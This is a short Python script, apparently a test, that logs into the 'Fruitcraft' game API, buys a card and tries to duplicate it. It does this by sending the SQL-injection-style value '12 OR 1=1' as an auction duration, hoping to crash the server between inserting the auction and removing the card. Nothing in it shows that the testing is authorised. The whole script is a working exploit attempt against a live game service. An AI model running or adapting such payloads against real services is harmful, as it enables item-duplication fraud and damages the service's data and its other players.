import sys, os, time
import json
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'api')))
from fruitcraft_client import FruitClient

def main():
    print('Testing Auction Duplicate (Partial Failure)...')
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1: return
    
    # Buy a card
    c1.post('/store/buycardpack', {'type': 1})
    time.sleep(1)
    
    d1 = c1.get_profile()
    c1_cards = d1.get('data', {}).get('cards', [])
    if not c1_cards: return
    
    c_target = c1_cards[0]['id']
    
    print(f'\n[+] Attempting to auction card {c_target} with a malformed string duration')
    # If duration='12 OR 1=1', maybe it inserts the auction, then tries to do math on duration and crashes before deleting the card.
    payload = {'card_id': c_target, 'start_price': 100, 'duration': '12 OR 1=1'}
    res = c1.post('/auction/setcardforauction', payload)
    print('Auction Result:', res)
    
    time.sleep(1)
    d2 = c1.get_profile()
    c2_cards = d2.get('data', {}).get('cards', [])
    still_has = any(c['id'] == c_target for c in c2_cards)
    print(f'Card {c_target} still in inventory? {still_has}')
    
    # Check if we have an active auction
    res_auc = c1.post('/auction/loadmyauctions', {})
    auctions = res_auc.get('data', {}).get('auctions', []) if isinstance(res_auc, dict) else []
    print(f'Active auctions count: {len(auctions)}')
    for auc in auctions:
        print(f'  - Auctioned Card: {auc.get("card_id")}')

if __name__ == '__main__':
    main()
